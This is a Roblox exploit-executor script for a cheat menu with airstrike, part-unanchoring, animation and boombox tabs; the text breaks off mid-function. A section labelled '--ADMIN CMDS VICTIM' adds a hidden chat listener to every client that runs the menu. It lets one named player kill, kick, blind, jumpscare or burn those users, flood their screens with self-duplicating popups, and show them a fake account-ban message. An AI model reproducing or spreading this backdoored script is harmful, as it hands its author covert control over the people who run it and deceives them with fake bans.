            createExplosionParticles(missile.Position)
            screenShake(0.5)  -- Call screen shake effect on impact

            -- Play explosion sound when missile lands
            local landingSound = Instance.new("Sound")
            landingSound.SoundId = explosionSoundId
            landingSound.Parent = workspace  -- Play in the workspace
            
            landingSound:Play()
            print("Launched")

            missile:Destroy()  -- Destroy the missile on impact
        end
    end)

    -- Remove the missile after a delay (if it doesn't hit anything)
    delay(5, function()
        missile:Destroy()
    end)
end

-- Function to blink the screen red
local function blinkScreen()
    local playerGui = player:WaitForChild("PlayerGui")
    local screen = Instance.new("ScreenGui", playerGui)
    local redOverlay = Instance.new("Frame", screen)
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.new(1, 0, 0)
    redOverlay.BackgroundTransparency = 0.5

    for i = 1, 3 do
        wait(1)  -- Wait for 1 second
        redOverlay.BackgroundTransparency = (i % 2 == 0) and 0.5 or 1  -- Blink effect

        -- Play blink sound
        local blinkSound = Instance.new("Sound")
        blinkSound.SoundId = blinkSoundId
        blinkSound.Parent = redOverlay
        blinkSound:Play()
    end
    
    screen:Destroy()  -- Clean up after blinking
end

-- Mercury Lib Button for Airstrike
local airstrikeButton = CsTab:Button{
    Name = "Airstrike",
    Description = "Launch an airstrike at your position",
    Callback = function()
        if character then  -- Check if character exists
            local playerPosition = character.HumanoidRootPart.Position

            -- Start the blink effect
            blinkScreen()

            -- Delay before launching missiles
            wait(2)  -- 3 seconds delay before launching

            -- Launch multiple missiles
            for i = -6, 6 do
                for j = -6, 6 do
                    if (i == 0 and j == 0) then continue end  -- Skip the center position
                    launchMissile(playerPosition + Vector3.new(i * 15, 0, j * 15))  -- Spread missiles further apart
                end
            end
            
            -- Launch a missile directly above the player
            launchMissile(playerPosition)  -- Launch missile directly at the player
        else
            print("Character not found. Cannot launch airstrike.")
        end
    end
}

-- Reconnect character when respawning
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
end)



local player = game.Players.LocalPlayer
local workspace = game:GetService("Workspace")

-- Function to unanchor all parts
local function unanchorAllParts()
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") then
            object.Anchored = false
        end
    end
    print("All parts have been unanchored.")
end

-- Create a button in your UI library (Mercury Lib example)
local unanchorButton = CsTab:Button{
    Name = "Unanchor All Parts",
    Description = "WARNING THIS WILL ONLY WORK ONCE AND DESTROY THE GAME",
    Callback = function()
        unanchorAllParts()
    end
}













local AniTab = GUI:Tab{
	Name = "Animations",
	Icon = "http://www.roblox.com/asset/?id=11932783331"
}

-- Get the player's character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()



-- Variables to store the current animation tracks
local jumpDanceAnimationTrack
local backflipAnimationTrack
local headthrowAnimationTrack
local crouchAnimationTrack

AniTab:Toggle{
	Name = "Jump Dance [R15]",
	StartingState = false,
	Description = nil,
	Callback = function(state)
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Load Animation for Jump Dance
		local jumpDanceAnimation = Instance.new("Animation")
		jumpDanceAnimation.AnimationId = "rbxassetid://507771019" -- Dab animation ID

		-- Create Animator
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

		if state then
			-- Play the jump dance animation if it's not already playing
			if not jumpDanceAnimationTrack or not jumpDanceAnimationTrack.IsPlaying then
				jumpDanceAnimationTrack = animator:LoadAnimation(jumpDanceAnimation)
				jumpDanceAnimationTrack:Play()
			end
		else
			-- Stop the jump dance animation if it's currently playing
			if jumpDanceAnimationTrack and jumpDanceAnimationTrack.IsPlaying then
				jumpDanceAnimationTrack:Stop()
			end
		end
	end
}



AniTab:Toggle{
	Name = "Hug [R6]",
	StartingState = false,
	Description = nil,
	Callback = function(state)
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Load Animation for Backflip
		local backflipAnimation = Instance.new("Animation")
		backflipAnimation.AnimationId = "rbxassetid://27432686" -- Backflip animation ID

		-- Create Animator
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

		if state then
			-- Play the backflip animation if it's not already playing
			if not backflipAnimationTrack or not backflipAnimationTrack.IsPlaying then
				backflipAnimationTrack = animator:LoadAnimation(backflipAnimation)
				backflipAnimationTrack:Play()
			end
		else
			-- Stop the backflip animation if it's currently playing
			if backflipAnimationTrack and backflipAnimationTrack.IsPlaying then
				backflipAnimationTrack:Stop()
			end
		end
	end
}



AniTab:Button{
	Name = "Head Throw [R6]",
	Description = nil,
	Callback = function()
    -- Get the player's character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Load Animation
local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://35154961" -- Replace with the desired animation ID

-- Create Animator
local humanoid = character:WaitForChild("Humanoid")
local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

-- Play the animation
local animationTrack = animator:LoadAnimation(animation)
animationTrack:Play()

     end
}


AniTab:Button{
	Name = "Floating Head [R6]",
	Description = nil,
	Callback = function()
    -- Get the player's character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Load Animation
local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://121572214" -- Replace with the desired animation ID

-- Create Animator
local humanoid = character:WaitForChild("Humanoid")
local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

-- Play the animation
local animationTrack = animator:LoadAnimation(animation)
animationTrack:Play()
wait(2)
animationTrack:Stop()
     end
}

AniTab:Toggle{
	Name = "Crouch [R6]",
	StartingState = false,
	Description = nil,
	Callback = function(state)
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Load Animation for Backflip
		local crouchAnimation = Instance.new("Animation")
		crouchAnimation.AnimationId = "rbxassetid://182724289" -- Backflip animation ID

		-- Create Animator
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

		if state then
			-- Play the backflip animation if it's not already playing
			if not crouchAnimationTrack or not crouchAnimationTrack.IsPlaying then
				crouchAnimationTrack = animator:LoadAnimation(crouchAnimation)
				crouchAnimationTrack:Play()
			end
		else
			-- Stop the backflip animation if it's currently playing
			if crouchAnimationTrack and crouchAnimationTrack.IsPlaying then
				crouchAnimationTrack:Stop()
			end
		end
	end
}






local cmdsTab = GUI:Tab{
	Name = "Admin Commands",
	Icon = "http://www.roblox.com/asset/?id=3805250049"
}

cmdsTab:Button{
	Name = "Bring",
	Description = nil,
	Callback = function()
    
setclipboard(".l bring")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

cmdsTab:Button{
	Name = "Sit",
	Description = nil,
	Callback = function()
    
setclipboard(".l sit")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Unsit",
	Description = nil,
	Callback = function()

setclipboard(".l unsit")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Kill",
	Description = nil,
	Callback = function()
    
setclipboard(".l kill")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Kick",
	Description = nil,
	Callback = function()
    
setclipboard(".l kick")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Fake Ban",
	Description = nil,
	Callback = function()
    
setclipboard(".l ban")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "You Are An Idiot",
	Description = nil,
	Callback = function()
    
setclipboard(".l idiot")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Destroy Idiot Virus",
	Description = nil,
	Callback = function()
    
setclipboard(".l destroyidiots")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Blind",
	Description = nil,
	Callback = function()
    
setclipboard(".l blind")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Not Blind",
	Description = nil,
	Callback = function()
    
setclipboard(".l unblind")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Burn",
	Description = nil,
	Callback = function()
    
setclipboard(".l burn")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Arab Hack",
	Description = nil,
	Callback = function()
    
setclipboard(".l arabhack")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Selene Hack",
	Description = nil,
	Callback = function()
    
setclipboard(".l selenehack")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}

cmdsTab:Button{
	Name = "Jumpscare",
	Description = nil,
	Callback = function()
    
setclipboard(".l jumpscare")

GUI:Notification{
	Title = "Success",
	Text = "Command copied to Clipboard",
	Duration = 3,
	Callback = function() end
}

     end
}


--ADMIN CMDS VICTIM






-- Command script for player actions
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local idiotWindows = {} -- Table to keep track of idiot windows
local blindOverlay -- Variable for the black overlay

-- Function to create the idiot window
local function createIdiotWindow()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local Frame_2 = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local ImageLabel = Instance.new("ImageLabel")
    local ImageLabel_2 = Instance.new("ImageLabel")
    local ImageLabel_3 = Instance.new("ImageLabel")
    local Sound = Instance.new("Sound")

    -- Properties:
    ScreenGui.Parent = game.CoreGui -- Use CoreGui for executor compatibility
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0, math.random(0, workspace.CurrentCamera.ViewportSize.X - 235), 0, math.random(0, workspace.CurrentCamera.ViewportSize.Y - 143))
    Frame.Size = UDim2.new(0, 235, 0, 143)
    Frame.Active = true
    Frame.Draggable = true

    Frame_2.Parent = Frame
    Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(0.0105528487, 0, 0.02109042, 0)
    Frame_2.Size = UDim2.new(0, 229, 0, 136)

    TextLabel.Parent = Frame_2
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.BorderSizePixel = 0
    TextLabel.Position = UDim2.new(0.0611353703, 0, 0.161764711, 0)
    TextLabel.Size = UDim2.new(0, 200, 0, 50)
    TextLabel.Font = Enum.Font.Bodoni
    TextLabel.Text = "you are an idiot"
    TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.TextSize = 32.000

    ImageLabel.Parent = Frame_2
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ImageLabel.BorderSizePixel = 0
    ImageLabel.Position = UDim2.new(0.41921398, 0, 0.573529422, 0)
    ImageLabel.Size = UDim2.new(0, 38, 0, 38)
    ImageLabel.Image = "http://www.roblox.com/asset/?id=10794668488"

    ImageLabel_2.Parent = Frame_2
    ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ImageLabel_2.BorderSizePixel = 0
    ImageLabel_2.Position = UDim2.new(0.689956307, 0, 0.573529422, 0)
    ImageLabel_2.Size = UDim2.new(0, 38, 0, 38)
    ImageLabel_2.Image = "http://www.roblox.com/asset/?id=10794668488"

    ImageLabel_3.Parent = Frame_2
    ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ImageLabel_3.BorderSizePixel = 0
    ImageLabel_3.Position = UDim2.new(0.170305684, 0, 0.573529422, 0)
    ImageLabel_3.Size = UDim2.new(0, 38, 0, 38)
    ImageLabel_3.Image = "http://www.roblox.com/asset/?id=10794668488"

    -- Sound Properties:
    Sound.Parent = Frame -- Attach sound to the Frame
    Sound.SoundId = "rbxassetid://2665943889" -- Replace with the actual sound ID
    Sound.Volume = 1
    Sound.Looped = true
    Sound:Play()

    -- Make the frame float around randomly with smooth movement
    spawn(function()
        while Frame.Parent do
            local newXPos = math.random(0, workspace.CurrentCamera.ViewportSize.X - 235)
            local newYPos = math.random(0, workspace.CurrentCamera.ViewportSize.Y - 143)

            -- Tweening to smooth movement
            Frame:TweenPosition(UDim2.new(0, newXPos, 0, newYPos), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 1, true)
            wait(1)
        end
    end)

    -- Duplicate the window when clicked by the local player
    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            if Players.LocalPlayer then
                createIdiotWindow()
            end
        end
    end)

    -- Keep track of created windows
    table.insert(idiotWindows, {Frame, Sound}) -- Store Frame and its Sound
end

-- Function to destroy all idiot windows
local function destroyIdiotWindows()
    for _, window in ipairs(idiotWindows) do
        if window[1] and window[1].Parent then
            window[2]:Stop() -- Stop the sound before destroying the window
            window[1]:Destroy() -- Destroy the frame
        end
    end
    idiotWindows = {} -- Clear the table
end

-- Function to create a blind overlay
local function createBlindOverlay()
    blindOverlay = Instance.new("ScreenGui")
    local overlayFrame = Instance.new("Frame")

    -- Overlay Properties
    blindOverlay.Parent = game.CoreGui
    blindOverlay.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    overlayFrame.Parent = blindOverlay
    overlayFrame.BackgroundColor3 = Color3.new(0, 0, 0) -- Black color
    overlayFrame.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
    overlayFrame.Position = UDim2.new(0, 0, 0, 0)
end

-- Function to remove the blind overlay
local function removeBlindOverlay()
    if blindOverlay then
        blindOverlay:Destroy()
        blindOverlay = nil
    end
end

-- Function to handle the chat message
local function onPlayerChatted(player, message)
    if player.Name == "Purpiverycool" then
        if message:lower() == ".l kill" then
            LocalPlayer.Character:BreakJoints()
        elseif message:lower() == ".l sit" then
            LocalPlayer.Character:Move(Vector3.new(0, -5, 0)) -- Move down slightly to simulate sitting
        elseif message:lower() == ".l unsit" then
            LocalPlayer.Character:Move(Vector3.new(0, 5, 0)) -- Move up slightly to simulate unsitting
        elseif message:lower() == ".l bring" then
            LocalPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame) -- Teleport to player
        elseif message:lower() == ".l kick" then
            game.Players.LocalPlayer:Kick("You have been kicked from the game.") -- Kick command
        elseif message:lower() == ".l ban" then
            game.Players.LocalPlayer:Kick("Your account has been BANNED") -- Fake ban
        elseif message:lower() == ".l idiot" then
            createIdiotWindow() -- Create idiot window
        elseif message:lower() == ".l destroyidiots" then
            destroyIdiotWindows() -- Destroy all idiot windows
        elseif message:lower() == ".l blind" then
            createBlindOverlay() -- Create black overlay
        elseif message:lower() == ".l unblind" then
            removeBlindOverlay() -- Remove black overlay
        elseif message:lower() == ".l selenehack" then

local soundId = "rbxassetid://9039981149"  -- Replace with your desired sound asset ID

-- Create a Sound instance
local sound = Instance.new("Sound")
sound.SoundId = soundId
sound.Volume = 1  -- Adjust volume (0 to 1)
sound.Parent = workspace

            local newTextureId = "http://www.roblox.com/asset/?id=12789381533"  -- Replace with your desired texture ID
local newSkyboxId = "http://www.roblox.com/asset/?id=12789381533"  -- Replace with your desired skybox ID

sound:Play()

-- Function to change textures, decals, surfaces, and skybox
local function changeTexturesAndSurfacesAndSkybox(obj)
    for _, descendant in pairs(obj:GetDescendants()) do
        -- Change textures and decals
        if descendant:IsA("Texture") or descendant:IsA("Decal") then
            descendant.Texture = newTextureId
        
        -- Change surfaces of Parts
        elseif descendant:IsA("Part") then
            for _, surface in pairs({"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}) do
                if descendant[surface] == Enum.SurfaceType.Studs or descendant[surface] == Enum.SurfaceType.Smooth then
                    local surfaceTexture = Instance.new("SurfaceGui", descendant)
                    surfaceTexture.CanvasSize = Vector2.new(100, 100)
                    local imageLabel = Instance.new("ImageLabel", surfaceTexture)
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Image = newTextureId
                    imageLabel.BackgroundTransparency = 1
                end
            end
        end
    end

    -- Change the skybox
    local lighting = game:GetService("Lighting")
    if lighting:FindFirstChild("Sky") then
        lighting.Sky:Destroy()
    end
    
    local skybox = Instance.new("Sky")
    skybox.SkyboxBk = newSkyboxId
    skybox.SkyboxDn = newSkyboxId
    skybox.SkyboxFt = newSkyboxId
    skybox.SkyboxLf = newSkyboxId
    skybox.SkyboxRt = newSkyboxId
    skybox.SkyboxUp = newSkyboxId
    skybox.Parent = lighting
end

-- Change textures, surfaces, and skybox in the entire game
changeTexturesAndSurfacesAndSkybox(game)

-- Optional: If new objects are added to the game, change their textures, surfaces, and skybox too
game.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Texture") or descendant:IsA("Decal") then
        descendant.Texture = newTextureId
    elseif descendant:IsA("Part") then
        for _, surface in pairs({"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}) do
            if descendant[surface] == Enum.SurfaceType.Studs or descendant[surface] == Enum.SurfaceType.Smooth then
                local surfaceTexture = Instance.new("SurfaceGui", descendant)
                surfaceTexture.CanvasSize = Vector2.new(100, 100)
                local imageLabel = Instance.new("ImageLabel", surfaceTexture)
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Image = newTextureId
                imageLabel.BackgroundTransparency = 1
            end
        end
    end
end)
        elseif message:lower() == ".l jumpscare" then
            local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))

-- Create an ImageLabel for the jumpscare image
local jumpscareImage = Instance.new("ImageLabel")
jumpscareImage.Size = UDim2.new(1, 0, 1, 0)  -- Fullscreen
jumpscareImage.Position = UDim2.new(0, 0, 0, 0)
jumpscareImage.Image = "http://www.roblox.com/asset/?id=18579103304"  -- Replace with your jumpscare image asset ID
jumpscareImage.BackgroundTransparency = 1
jumpscareImage.Parent = screenGui

-- Create a Sound for the jumpscare
local jumpscareSound = Instance.new("Sound")
jumpscareSound.SoundId = "rbxassetid://5528579362"  -- Replace with your sound asset ID
jumpscareSound.Volume = 1
jumpscareSound.Parent = screenGui

-- Function to trigger the jumpscare
local function triggerJumpscare()
    jumpscareSound:Play()  -- Play the sound
    jumpscareImage.Visible = true  -- Show the image

    wait(2)  -- Wait for 2 seconds (adjust as needed)

    jumpscareImage.Visible = false  -- Hide the image
end

-- Trigger the jumpscare (call this function whenever you want to activate it)
triggerJumpscare()

        elseif message:lower() == ".l arabhack" then
          local newTextureId = "http://www.roblox.com/asset/?id=14562324443"  -- Replace with your desired texture ID
local newSkyboxId = "http://www.roblox.com/asset/?id=14562324443"  -- Replace with your desired skybox ID

-- Function to change textures, decals, surfaces, and skybox
local function changeTexturesAndSurfacesAndSkybox(obj)
    for _, descendant in pairs(obj:GetDescendants()) do
        -- Change textures and decals
        if descendant:IsA("Texture") or descendant:IsA("Decal") then
            descendant.Texture = newTextureId
        
        -- Change surfaces of Parts
        elseif descendant:IsA("Part") then
            for _, surface in pairs({"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}) do
                if descendant[surface] == Enum.SurfaceType.Studs or descendant[surface] == Enum.SurfaceType.Smooth then
                    local surfaceTexture = Instance.new("SurfaceGui", descendant)
                    surfaceTexture.CanvasSize = Vector2.new(100, 100)
                    local imageLabel = Instance.new("ImageLabel", surfaceTexture)
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Image = newTextureId
                    imageLabel.BackgroundTransparency = 1
                end
            end
        end
    end

    -- Change the skybox
    local lighting = game:GetService("Lighting")
    if lighting:FindFirstChild("Sky") then
        lighting.Sky:Destroy()
    end
    
    local skybox = Instance.new("Sky")
    skybox.SkyboxBk = newSkyboxId
    skybox.SkyboxDn = newSkyboxId
    skybox.SkyboxFt = newSkyboxId
    skybox.SkyboxLf = newSkyboxId
    skybox.SkyboxRt = newSkyboxId
    skybox.SkyboxUp = newSkyboxId
    skybox.Parent = lighting
end

-- Change textures, surfaces, and skybox in the entire game
changeTexturesAndSurfacesAndSkybox(game)

-- Optional: If new objects are added to the game, change their textures, surfaces, and skybox too
game.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Texture") or descendant:IsA("Decal") then
        descendant.Texture = newTextureId
    elseif descendant:IsA("Part") then
        for _, surface in pairs({"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}) do
            if descendant[surface] == Enum.SurfaceType.Studs or descendant[surface] == Enum.SurfaceType.Smooth then
                local surfaceTexture = Instance.new("SurfaceGui", descendant)
                surfaceTexture.CanvasSize = Vector2.new(100, 100)
                local imageLabel = Instance.new("ImageLabel", surfaceTexture)
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Image = newTextureId
                imageLabel.BackgroundTransparency = 1
            end
        end
    end
end)

  
        elseif message:lower() == ".l burn" then

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:FindFirstChild("Humanoid")

-- Create and attach the fire effect
local fire = Instance.new("Fire")
fire.Parent = character:FindFirstChild("HumanoidRootPart")
fire.Size = 10  -- Adjust the size of the fire
fire.Heat = 20  -- Adjust the heat of the fire

-- Create and attach the burning sound
local burningSound = Instance.new("Sound")
burningSound.SoundId = "rbxassetid://5052623884"  -- Burning sound asset ID
burningSound.Looped = true
burningSound.Volume = 1
burningSound.Parent = character:FindFirstChild("HumanoidRootPart")
burningSound:Play()

-- Reduce health every second
local healthReduction = coroutine.create(function()
    while humanoid.Health > 0 do
        humanoid.Health = humanoid.Health - 10
        wait(1)
    end

    -- Stop the fire and sound when the player dies
    fire:Destroy()
    burningSound:Stop()
end)

coroutine.resume(healthReduction)



        end
    end
end

-- Function to set up the chat listener for each player
local function onPlayerAdded(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end

-- Set up the chat listener for players who are already in the game
for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

-- Set up the chat listener for players who join the game in the future
Players.PlayerAdded:Connect(onPlayerAdded)





--SOUNDS



local BgTab = GUI:Tab{
	Name = "Settings",
	Icon = "http://www.roblox.com/asset/?id=11932591062"
}

-- Create the sound instance outside the toggle callback
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://9047105584" -- Replace with your sound ID
sound.Looped = true -- Ensure the sound loops
sound.Parent = game.Workspace

BgTab:Toggle{
    Name = "Background Music",
    StartingState = false,
    Description = nil,
    Callback = function(state)
        if state then
            sound:Play()
        else
            sound:Stop()
        end
    end
}

local SoundTab = GUI:Tab{
	Name = "Boombox",
	Icon = "http://www.roblox.com/asset/?id=302250236"
}

SoundTab:Button{
	Name = "Hedied",
	Description = nil,
	Callback = function()
    setclipboard("6674053789")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}


SoundTab:Button{
	Name = "Axxturel",
	Description = nil,
	Callback = function()
    setclipboard("6706336813")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Mexican Rap",
	Description = nil,
	Callback = function()
    setclipboard("6942391979")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "DaPumking0d Phonk",
	Description = nil,
	Callback = function()
    setclipboard("6676732301")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Change Ya Life",
	Description = nil,
	Callback = function()
    setclipboard("6831109213")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "On Some Barrio Shit",
	Description = nil,
	Callback = function()
    setclipboard("6889574376")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "K_5X",
	Description = nil,
	Callback = function()
    setclipboard("6897832025")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Furr",
	Description = nil,
	Callback = function()
    setclipboard("6896306675")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Paint It Black",
	Description = nil,
	Callback = function()
    setclipboard("6828176320")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Brooklyn Pop",
	Description = nil,
	Callback = function()
    setclipboard("6823597327")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Love Sosa Short",
	Description = nil,
	Callback = function()
    setclipboard("7534863991")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Summer Song",
	Description = nil,
	Callback = function()
    setclipboard("6847929757")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Call On Me",
	Description = nil,
	Callback = function()
    setclipboard("4829702007")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "!?",
	Description = nil,
	Callback = function()
    setclipboard("6753817247")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "KroxxxxRoadxxxx",
	Description = nil,
	Callback = function()
    setclipboard("6893776529")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}

SoundTab:Button{
	Name = "Hella Sketchy",
	Description = nil,
	Callback = function()
    setclipboard("6788646778")
    GUI:Notification{
	Title = "LIMBO",
	Text = "ID Copied To Clipboard",
	Duration = 3,
	Callback = function() end
}
     end
}
















--CREDS

GUI:Credit{
	Name = "Purpi",
	Description = "Scripter",
	Discord = "jinglebellsskeletonjelly"
}

GUI:Credit{
	Name = "Kappe",
	Description = "Tester",
	Discord = "kappe5628"
}

GUI:Credit{
	Name = "LIMBO Server",
	Description = "",
	Discord = "https://discord.gg/DNMr7qC2r3"
}

GUI:Credit{
	Name = "Genesis FE",
	Description = "Genesis Tab",
	Discord = "https://discord.gg/fescripts"
}

local HatcolTab = GUI:Tab{
	Name = "Hat Collide",
	Icon = "http://www.roblox.com/asset/?id=8575479406"
}

HatcolTab:Button{
	Name = "Football",
	Description = nil,
	Callback = function() 
    
    local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()

-- Function to modify a hat
local function modifyHat(hatName, isFalling, newPosition, newOrientation)
    local hat = Character:FindFirstChild(hatName)

    if hat then
        -- Remove the accessory weld
        if hat.Handle:FindFirstChild("AccessoryWeld") then
            hat.Handle.AccessoryWeld:Destroy()
        end
        
        -- Remove any meshes in the hat
        for _, mesh in pairs(hat:GetDescendants()) do
            if mesh:IsA("MeshPart") or mesh:IsA("SpecialMesh") then
                mesh:Destroy()
            end
        end
        
        -- Set handle properties
        hat.Handle.CanCollide = true -- Allow collision
        
        if isFalling then
            hat.Handle.Anchored = false -- Make it fall under gravity
        else
            hat.Handle.Anchored = true -- Anchor it to keep it in place
        end

        -- Set the position of the hat using the newPosition parameter
        hat.Handle.Position = newPosition

        -- Rotate the Baseball Bat to face the player
        hat.Handle.Orientation = newOrientation

        -- Reparent the hat to the Workspace to keep it in place
        hat.Parent = game.Workspace

        if isFalling then
            -- Create a function to handle the kick effect for Space Cop
            local function onTouch(otherPart)
                local character = otherPart.Parent
                local humanoid = character:FindFirstChildOfClass("Humanoid")

                if humanoid then
                    -- Calculate the kick direction and strength
